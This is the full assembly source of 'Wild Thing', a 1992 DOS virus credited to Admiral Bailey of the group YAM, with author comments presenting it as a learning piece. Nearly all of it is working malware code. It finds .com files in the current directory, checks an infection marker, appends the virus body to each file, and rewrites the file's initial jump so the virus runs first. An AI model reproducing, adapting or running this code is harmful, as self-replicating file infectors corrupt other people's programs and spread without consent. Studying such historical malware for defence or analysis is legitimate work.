;****************************************************************************
;
; Wild Thing Virus
;
; By Admiral Bailey - Youths Against McAfee
;
; Ahh the good old days.  This is my first com infector.  Oh well hope you
; learn something off it.
;
;****************************************************************************

code    segment public 'code'
        assume  cs:code, ds:code, ss:code, es:code
        org     100h

bof     equ     $                       ; marks the beginning of the file

start:
        jmp     virus

program db      0cdh,20h,7,8,9          ; just here as a dummy program
                                        ; cd 20 ect.  It is also used as a
                                        ; marker to see if the file is
                                        ; infected

baj     equ     $                       ; marks the beginning after the jmp

virussize       =     eof - bof         ; automatically calcs the size of the
                                        ; file

;---
;  This is the beginning...
;---------
virus:
        call    realcode                ; push loc on stack

realcode        proc    near
        pop     si                      ; will pop this loc off into si
        push    si                      ; and then put it back on so we have
                                        ; the number but dont inturrupt
                                        ; anything
        sub     si,offset realcode      ; get the loc in file where bov is
        mov     bp,[si+offset oldjump2] ; put in bp where we will jump when
        add     bp,offset program       ; done

;---
;  This procedure finds the first file in the current dir...
;----------
        mov     ah,4eh                  ; findfirst command
        lea     dx,[si+offset filespec] ; load loc of filespec in dx
        xor     cx,cx                   ; find normal attrib
        int     21h

        jc      quit                    ; none found then quit
        jmp     openfile                ; if found file then open it

;---
;  This quits the program
;---------
quit:
        mov     ah,09h
        mov     dx,si
        add     dx,offset messege
        int     21h

        jmp     bp                      ; jump back to orig program.

;---
;  If we found a first file then their might be another... here we look for
;  more com files.
;---------
findnext:
        mov     ah,4fh                  ; find next file
        int     21h

        jc      quit                    ; no more files then quit

;---
;  This procedure opens the file
;---------
openfile:
        mov     ax,3d02h                ; open file for read/write
        mov     dx,80h + 1eh            ; file name loc in dta
        int     21h

        mov     bx,ax                   ; put handle in bx
        jc      findnext                ; if error opening then get another

;---
;  Here we read the first three bytes 'jmp XXXX' and store for later...
;--------
        mov     cx,3                    ; read 1st 3 bytes
        mov     ah,3fh                  ; read file command
        mov     dx, si                  ; get loc in file where bov is
        add     dx,offset oldjump       ; add offset where we keep read
        mov     di,dx                   ; put loc of buffer in di for later
        int     21h                     ; read the file

        jc      closefile               ; if error close up and find another

        cmp     byte ptr [di],0e9h      ; is file larger than 256?
        jne     closefile               ; nope then quit

        ; there must be a way I can take out this part

        mov     dx,[di+1]               ; put the jump value in dx
        mov     [si+offset oldjump2],dx ; move that jump value by its self

        xor     cx,cx                   ; put 0 in cx
        mov     ax,4200h                ; this will set the file pointer to
                                        ; where the ident. string would be
        int     21h

        mov     dx,di                   ; the location buffer
        mov     cx,2                    ; read two bytes only marker
        mov     ah,3fh                  ; read bytes
        int     21h

        cmp     word ptr [di], 807h     ; check if file already infected
                                        ; (pop es)

        je      closefile               ; already infected get another

;---
;  Now move the file pointer to the end
;---------
        mov     ax,4202h                ; set file pointer to eof
        xor     cx,cx                   ; clear these
        xor     dx,dx                   ;
        int     21h

        jc      closefile               ; if error quit

        cmp     dx,0                    ; is file too large
        jne     closefile               ; yes then quit

        push    bx                      ; save handle on stack

        mov     bx, si                  ; loc of bov in file
        add     bx,offset newjump       ; add offset of new jump
        mov     [bx],ax                 ; save new jump

        pop     bx                      ; get handle off stack

;---
;  Write the virus to end
;---------
        mov     ah,40h                  ; write the virus
        mov     cx,virussize+3          ; number of bytes + extra
        mov     dx,si
        add     dx,offset baj           ; where to start writing from
        sub     dx,3                    ; sub 3 because of jump or something
        int     21h

        jc      closefile               ; if error writing quit file

;---
;  Now we have to move the fp to the beginning of the file
;---------
        mov     ax,4200h                ; set file pointer to begin
        xor     cx,cx                   ; clear this
        mov     dx,1                    ; set right after first jump
        int     21h

;---
;  Now we write back the first bytes... 'jmp viruscode'
;---------
        mov     ah,40h                  ; write to file
        mov     cx,2                    ; just the new jump
        mov     dx, si
        add     dx,offset newjump       ; where the new jump is
        int     21h                     ; write it...

;---
;  Close the file
;---------
closefile:
        mov     ah,3eh                  ; close file
        int     21h

        jmp     findnext                ; find another file


realcode        endp

messege         db      'This is a Wild Thing',13,10
                db      'Programmed By Admiral Bailey [YAM]',13,10
                db      '(C) 1992 YAM Inc.',13,10,'$'
filespec        db      '*.com',0       ; type of files to find
oldjump         db      3 dup (0)       ; to hold the old jump with jmp
oldjump2        dw      0               ; to hold just the old jump loc
newjump         dw      0               ; holds the new jump

eof     equ     $                       ; marks the total end of the file

code    ends

        end     start


